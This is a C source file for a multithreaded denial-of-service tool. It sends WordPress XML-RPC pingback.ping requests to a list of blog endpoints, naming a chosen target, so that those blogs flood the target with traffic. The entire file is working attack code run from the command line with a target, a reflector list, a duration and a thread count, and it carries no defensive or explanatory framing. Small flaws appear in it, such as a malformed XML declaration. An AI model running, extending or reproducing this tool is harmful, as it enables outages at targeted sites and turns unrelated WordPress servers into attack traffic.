/*
gcc xmlrpc.c -Wall -ggdb -fopenmp -o xmlrpc
*/
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#include "omp.h"

static unsigned int nthreads = 1;    
static int sig_stop = 0;    

#define payloadSize 4096
#define packetSize (payloadSize + 4096)

struct url_t{    
    char * proto;
    char * host;
    char * path;
};

struct line_t{    
    char * url;    
    char * rpc;    
    struct addrinfo *rp;    
    struct url_t aURL;    
} *data;
static unsigned int dataSize = 0;    

static void signal_handler(int sig){
    switch(sig){
        case SIGINT:
        case SIGTERM:
            printf("Received interrupt signal. Stopping program...\n");
            sig_stop = 1;
            break;
    }
};

static int die(int rc){
    #pragma omp atomic
    sig_stop++;

    if(sig_stop > nthreads){    

        printf("Freeing global data\n");
        int i;
        for(i=0; i < dataSize; i++){
            free(data[i].url);
            free(data[i].rpc);
            free(data[i].rp->ai_addr);
            freeaddrinfo(data[i].rp);
            free(data[i].aURL.host);
            free(data[i].aURL.proto);
            free(data[i].aURL.path);
        }
        free(data);
    }

    printf("Thread %i done\n", omp_get_thread_num());
    exit(rc);
}

static char * parse_url(char * url_str, struct url_t* url){
    char * proto_end = strstr(url_str, "://");
    url->proto = (proto_end != NULL)? strndup(url_str, (proto_end - url_str))
        : NULL;
    char * host_end = strchr(&proto_end[3], '/');
    url->host =  (host_end != NULL) ? strndup(&proto_end[3], (host_end - &proto_end[3]))
        : NULL;

    url->path = (host_end != NULL)  ? strdup(&host_end[1])
        : NULL;

    return url->host;
}

/*static struct addrinfo * get_ip(const char * host, const int port){
    struct addrinfo hints;
    struct addrinfo *result;

    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;    
    hints.ai_socktype = 0;
    hints.ai_flags = AI_NUMERICSERV;
    hints.ai_protocol = 0;    
    hints.ai_canonname = NULL;
    hints.ai_addr = NULL;
    hints.ai_next = NULL;

    char service[6]={0};
    snprintf(service, 6, "%i", port);
    int s = getaddrinfo(host, service, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
            return NULL;
    }
    return result;
};*/

static int connect_me(const struct line_t * line, const unsigned short port, const unsigned short timeout){

    struct addrinfo * rp = line->rp;

    int skt = -1;
    if ((skt = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) < 0){
        perror("socket");
        fprintf(stderr, "Error connecting to %s on port %i\n", line->aURL.host, port);
        return -1;
    }

    struct timeval    tv_tout;    

    /* TODO: this does NOT work! Why ?
    tv_tout.tv_sec = timeout; tv_tout.tv_usec = 0;
    if(setsockopt(skt, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv_tout,sizeof(struct timeval)) == -1){
        perror("setsockopt");
        freeaddrinfo(rp);
        return -1;
    };*/
    int on = 1;
    if (ioctl(skt, (int)FIONBIO, (char *)&on)){
        printf("ioctl FIONBIO call failed\n");
    }

    connect(skt, rp->ai_addr, rp->ai_addrlen);

    fd_set  skt_set;
    FD_ZERO(&skt_set);
    FD_SET(skt, &skt_set);

    tv_tout.tv_sec = timeout;
    tv_tout.tv_usec = 0;

    int rc = select(skt+1, NULL, &skt_set, NULL, &tv_tout);
    if(rc < 0){
        close(skt);
        fprintf(stderr, "Error connecting to %s on port %i\n", line->aURL.host, port);
        return -1;
    }else if(rc == 0){
        close(skt);
        fprintf(stderr, "Timeout connecting to %s on port %i\n",line->aURL.host, port);
        return -1;
    }

    return skt;
};

static int do_request(char * packet,
            const struct line_t * line, const char * payload, const unsigned int payloadLen){

    int skt = connect_me(line, 80, 2);    
    if(skt == -1){
        return 1;
    }

    static const char packetFormat[] = "POST /%s HTTP/1.0\r\n"    
"Host: %s\r\n"    
"Content-type: text/xml\r\n"
"Content-length: %i\r\n"    
"User-agent: Mozilla/4.0 (compatible: MSIE 7.0; Windows NT 6.0)\r\n"
"Connection: close\r\n\r\n"
"%s";

    int packetLen = snprintf(packet, packetSize, packetFormat, line->aURL.path, line->aURL.host, payloadLen, payload);

    if(send(skt, packet, packetLen, 0) == -1){
        perror("send");
    }
    close(skt);
    return 0;
};

static int get_lines(const char * filepath){

    FILE *fin = fopen(filepath, "r");
    if(fin == NULL){
        fprintf(stderr, "Unable to open '%s'\n", filepath);
        return 1;
    }

    size_t lineSize = 4096;
    char * line = (char*) malloc(lineSize);
    if(line == NULL){
        perror("malloc");
        return 1;
    }

    int bytes = 0;
    while((bytes = getline(&line, &lineSize, fin)) > 0){
        if(line[bytes-1] == '\n');
            dataSize++;
    }
    rewind(fin);

    data = (struct line_t*) malloc(sizeof(struct line_t)*dataSize);
    if(data == NULL){
        perror("malloc");
        return 1;
    }

    int i=0, line_i=0;
    char pton_buf[512]={0};
    while((bytes = getline(&line, &lineSize, fin)) > 0){
        line_i++;
        line[bytes-1] = '\0'; 
        char * space = strchr(line, ' ');
        if(space == NULL){
            continue;
        }

        data[i].url = strndup(line, (space - line));

        char * rpc = &space[1];
        space = strchr(&space[1], ' ');
        space[0] = '\0';

        data[i].rpc = strdup(rpc);

        char * rp_info = &space[1];
        data[i].rp = (struct addrinfo*) malloc(sizeof(struct addrinfo));
        if(data[i].rp == NULL){
            perror("malloc");
            die(1);
        }

        if(5 != sscanf(rp_info, "%i %i %i %u %s", &data[i].rp->ai_family,    &data[i].rp->ai_socktype,
          &data[i].rp->ai_protocol, &data[i].rp->ai_addrlen, pton_buf)){
            fprintf(stderr, "Error: Failed to parse 5 columns from line %i\n", line_i);
            die(1);
        }

        void *ptr;
        switch (data[i].rp->ai_family){
        case AF_INET:
            data[i].rp->ai_addr = (struct sockaddr *) malloc(sizeof(struct sockaddr_in));
            if(data[i].rp->ai_addr == NULL){
                perror("malloc"); die(1);
            }
            ptr = &((struct sockaddr_in *) data[i].rp->ai_addr)->sin_addr;
            ((struct sockaddr_in *) data[i].rp->ai_addr)->sin_port = htons(80);
          break;
        case AF_INET6:
            data[i].rp->ai_addr = (struct sockaddr *) malloc(sizeof(struct sockaddr_in6));
            if(data[i].rp->ai_addr == NULL){
                perror("malloc"); die(1);
            }
            ptr = &((struct sockaddr_in6 *) data[i].rp->ai_addr)->sin6_addr;
            ((struct sockaddr_in6 *) data[i].rp->ai_addr)->sin6_port = htons(80);
          break;
        }
        data[i].rp->ai_addr->sa_family = data[i].rp->ai_family;
        data[i].rp->ai_canonname = NULL;
        data[i].rp->ai_next = NULL;

        if(inet_pton(data[i].rp->ai_family, pton_buf, ptr) != 1){
            perror("inet_pton");
            die(1);
        }

        if(parse_url(rpc, &data[i].aURL) == NULL){
            fprintf(stderr, "Error: Parsing %s\n", data[i].rpc);
            die(1);    
        }

        i++;

    }
    dataSize = i;

    printf("Parsed %u lines from '%s'\n", i, filepath);
    free(line);
    fclose(fin);
    return 0;
}

int main(const int argc, const char * argv[]){    

    if(argc != 5){
        fprintf(stderr, "Usage: $0 {target} {file} {seconds} {threads}\n");
        return 1;
    }

    const char * target     = argv[1];
    const char * webFile = argv[2];
    unsigned int seconds = atoi(argv[3]);
    nthreads             = atoi(argv[4]);

    struct sigaction act, act_old;
    act.sa_handler = signal_handler;
    act.sa_flags = 0;
    sigemptyset(&act.sa_mask);
    if(    (sigaction(SIGINT,  &act, &act_old) == -1)    ||        
        (sigaction(SIGTERM, &act, &act_old) == -1)){
        perror("signal:");
        return 1;
    }

    static const char payloadFormat[] = "<?xmlversion=\"1.0\"?>"
"<methodCall>"
"<methodName>pingback.ping</methodName>"
"<params>"
"<param><value><string>%s</string></value></param>"    
"<param><value><string>%s</string></value></param>"    
"</params>"
"</methodCall>";

    if(get_lines(webFile) == 1){
        return 1;
    }

    time_t t3   = time(NULL);
    time_t tEnd = t3 + seconds;

    if(nthreads > dataSize){
        printf("Warning: Threads count > URL count. Reducing threads to %i\n", dataSize);
        nthreads = dataSize;
    }

    int chunk = dataSize / nthreads;

#pragma omp parallel num_threads(nthreads)
{
    int tid = omp_get_thread_num();
    char *payload = (char*) malloc(payloadSize);
    char *packet  = (char*) malloc(payloadSize + 4096);
    if((payload == NULL) || (packet == NULL)){
        perror("malloc");
        die(1);
    }

    int istart      = tid * chunk;
    int iend = istart + chunk;
    if(tid == (nthreads-1))    
        iend += (dataSize % nthreads);    

    while(sig_stop == 0){    

        #pragma omp flush(sig_stop)
        int i=0;
        time_t i1 = time(NULL);
        for(i=istart; i < iend; i++){
            if( (time(NULL) >= tEnd) || (sig_stop > 0) ){
                printf("Thread %i out of time\n", tid);
                i = iend;
                #pragma omp atomic
                sig_stop++;
                continue;
            }

            int payloadLen = snprintf(payload, payloadSize, payloadFormat, target, data[i].url);
            do_request(packet, &data[i], payload, payloadLen);

            usleep(10000);

            #pragma omp critical
            printf("%s\n", data[i].url);
        }
        time_t i2 = time(NULL);
        #pragma omp critical
        printf("%i| %i requests done for %lu sec\n", tid, (iend-istart), (i2-i1) );
    }
    free(payload);
    free(packet);

    #pragma omp atomic
    ++sig_stop;
} 

    time_t t4 = time(NULL);
    printf("Runtime: %lus\n", t4-t3);

    die(0);
    return 0;
}